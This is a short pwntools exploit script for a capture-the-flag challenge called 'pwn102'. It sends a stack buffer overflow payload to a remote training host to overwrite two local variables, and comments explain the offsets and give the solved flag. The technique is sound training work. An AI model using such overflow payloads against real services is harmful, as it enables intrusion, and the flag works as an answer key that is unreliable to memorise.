#!/usr/bin/env python3

from pwn import *

exe = './pwn102.pwn102'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

#p=process()
p=remote('10.10.159.253',9002)

padding = 104

param1 = 0xc0d3
param2 = 0xc0ff33

payload = padding * b'A'
payload +=p32(0xc0d3)
payload +=p32(0xc0ff33)

p.sendlineafter(b'?',payload)
p.interactive()

# x $rbp-4
# I need %x to %x\x0aAm I right? \x00%s\x00Yes, I need %x to %x\x0a\x00/bin/sh\x00\x00I'm feeling dead, coz you said I need bad food. It shows printf reading our input as string since %s and strings terminate with 0x00 nullbyte
# scanf also does no bounds checking
# DWORD PTR [rbp-0x4],0xc0ff33  , DWORD PTR [rbp-0x8],0xc0d3, value at rbp-0x4 = 0xbadf00d, value at rbp-0x8 =0xfee1dead
# we start writing out input at rbp-0x70(112)
# 0x70(112)-0x4 =108   and 0x70 - 0x8 = 104, so after 104, we need to input c0d3 and from 108 to 112 we need c0ff33 
#cannot use payload=flat() coz file is 64 bit and variables we are setting are 32 bits and this command will flatten it for a 64 bit variable
# python2 -c "print 'A'*104 + '\xd3\xc0\x00\x00'+ '\x33\xff\xc0\x00'  " > payload
# flag : THM{y3s_1_n33D_C0ff33_to_C0d3_<3}

